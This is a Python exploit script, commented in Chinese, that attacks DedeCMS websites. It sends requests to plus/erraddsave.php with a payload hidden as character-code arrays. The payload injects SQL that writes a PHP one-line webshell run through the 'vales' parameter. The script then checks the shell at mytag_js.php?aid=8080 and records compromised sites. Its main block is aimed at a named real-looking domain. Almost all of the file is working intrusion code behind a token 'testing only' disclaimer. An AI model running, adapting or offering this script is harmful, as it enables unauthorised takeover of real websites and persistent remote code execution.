#!/usr/local/bin/python
#-*- coding: UTF-8 -*-
##神龙:29295842    BLOG:http://hi.baidu.com/alalmn
#本软件只是测试使用  大家别乱想啊
#guige dede 0.9--changed by techxsh.py
#http://hi.baidu.com/alalmn/item/2c0dbe03b5dc35f2a0103415
#https://forum.90sec.org/forum.php?mod=viewthread&tid=7639&highlight=dede
import sys
import threading
sys.path.append('..')
import Class_Queue
import urllib
import urllib2
###########dedecms官方一句话扫描##########################
class exp_dedecms_8080_getshell(threading.Thread):
    def __init__(self,url):
        threading.Thread.__init__(self)
        self.url=url  #URL
        if not(("http://" in self.url) or ("https://" in self.url)):
            self.url="http://"+self.url
        self.scan(self.url)

    def get_domain(self,data,bool=0):
    # URL提取URL
        try:
            data += "/"      #data ="https://www.baidu.com/cache/sethelp/index.html"
            #bool=0   #0不带HTTP   1带HTTP
            if data.find("http://") == 0:
                data = data[7:] #字符串删除
                nPos1 = data.index('/') # 查找字符
                if bool==0:
                    return data[0:nPos1]   # 复制指定长度的字符
                else:
                    return "%s%s"%("http://",data[0:nPos1])   # 复制指定长度的字符
            if data.find("https://") == 0:
                data = data[8:]  # 字符串删除
                nPos2 = data.index('/') #查找字符
                #return data[0:nPos] #复制指定长度的字符
                if bool==0:
                    return data[0:nPos2]   # 复制指定长度的字符
                else:
                    return "%s%s"%("https://",data[0:nPos2])   # 复制指定长度的字符
        except:
            pass

    def scan(self,url):
        posturl = url+"/plus/erraddsave.php"
        geturl = url+"/plus/mytag_js.php"
        geturl2 = url+"/plus/mytag_js.php?aid=8080&nocache=90sec"
        getheader = {
            "Connection": "Keep-Alive",
            "Content-Type": "text/plain; Charset=UTF-8",
            "Accept": "*/*",
            "Cookie": "xxxx;",
            "User-Agent": "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
            "tijiao": "90sec",
            #"Content-Length": "1959",
            "Host": self.get_domain(url)
        }
        postheader = {
            "Connection": "Keep-Alive",
            "Content-Type": "application/x-www-form-urlencoded;",
            "Charset": "UTF-8",
            "Accept": "*/*",
            "Cookie": "xxxx;",
            "User-Agent": "Mozilla/4.0 (compatible; Win32; WinHttp.WinHttpRequest.5)",
            "tijiao": "90sec",
            "Content-Length": "1430",
            "Host": self.get_domain(url)
        }
        postdata1 = "dopost=saveedit&arrs1[]=99&arrs1[]=102&arrs1[]=103&arrs1[]=95&arrs1[]=100&arrs1[]=98&arrs1[]=112&arrs1[]=114&arrs1[]=101&arrs1[]=102&arrs1[]=105&arrs1[]=120&arrs2[]=109&arrs2[]=121&arrs2[]=116&arrs2[]=97&arrs2[]=103&arrs2[]=96&arrs2[]=32&arrs2[]=40&arrs2[]=97&arrs2[]=105&arrs2[]=100&arrs2[]=44&arrs2[]=110&arrs2[]=111&arrs2[]=114&arrs2[]=109&arrs2[]=98&arrs2[]=111&arrs2[]=100&arrs2[]=121&arrs2[]=41&arrs2[]=32&arrs2[]=86&arrs2[]=65&arrs2[]=76&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=40&arrs2[]=56&arrs2[]=48&arrs2[]=56&arrs2[]=48&arrs2[]=44&arrs2[]=39&arrs2[]=60&arrs2[]=63&arrs2[]=112&arrs2[]=104&arrs2[]=112&arrs2[]=32&arrs2[]=64&arrs2[]=112&arrs2[]=114&arrs2[]=101&arrs2[]=103&arrs2[]=95&arrs2[]=114&arrs2[]=101&arrs2[]=112&arrs2[]=108&arrs2[]=97&arrs2[]=99&arrs2[]=101&arrs2[]=40&arrs2[]=39&arrs2[]=39&arrs2[]=47&arrs2[]=91&arrs2[]=99&arrs2[]=111&arrs2[]=112&arrs2[]=121&arrs2[]=114&arrs2[]=105&arrs2[]=103&arrs2[]=104&arrs2[]=116&arrs2[]=93&arrs2[]=47&arrs2[]=101&arrs2[]=39&arrs2[]=39&arrs2[]=44&arrs2[]=36&arrs2[]=95&arrs2[]=82&arrs2[]=69&arrs2[]=81&arrs2[]=85&arrs2[]=69&arrs2[]=83&arrs2[]=84&arrs2[]=91&arrs2[]=39&arrs2[]=39&arrs2[]=118&arrs2[]=97&arrs2[]=108&arrs2[]=101&arrs2[]=115&arrs2[]=39&arrs2[]=39&arrs2[]=93&arrs2[]=44&arrs2[]=39&arrs2[]=39&arrs2[]=101&arrs2[]=114&arrs2[]=114&arrs2[]=111&arrs2[]=114&arrs2[]=39&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=63&arrs2[]=62&arrs2[]=39&arrs2[]=41&arrs2[]=59&arrs2[]=0"
        postdata1 = postdata1.encode("utf-8")
        #urlget = urllib.request.Request(geturl, headers=getheader)
        data = urllib.urlencode(getheader)
        try:
            req = urllib2.Request(geturl, data)
            response = urllib2.urlopen(req)
            the_page = response.read()
            #urlopen = urllib.request.urlopen(urlget).read()
            #print("200 OK")
            #print(urlopen)
        except:
            return 0

        try:
            data = urllib.urlencode(postheader)
            req = urllib2.Request(posturl+"?"+postdata1, data)
            response = urllib2.urlopen(req)
            the_page = response.read()
        except:
            return 0

        data = urllib.urlencode(getheader)
        try:
            req = urllib2.Request(geturl2, data)
            response = urllib2.urlopen(req)
            the_page = response.read()
            if len(the_page) > 0:
                EXP_list=[self.url,"exp","exp_dedecms_8080_getshell",url+"/plus/mytag_js.php?aid=8080","vales","webshell"]
                    ##["网址","漏洞类型","漏洞详细信息","漏洞地址","密码","备注"]
                    #print EXP_list
                Class_Queue.exp_url.put(EXP_list,0.5)   #插入队列
        except:
            return 0


################################################
if __name__=='__main__':
    threads = []  #线程
    for i in range(1):  #nthreads=10  创建10个线程
        threads.append(exp_dedecms_8080_getshell("http://www.szlsfw.com"))
    #http://www.647.com.cn/plus/mytag_js.php?aid=9090|guige
    for t in threads:
        t.start()

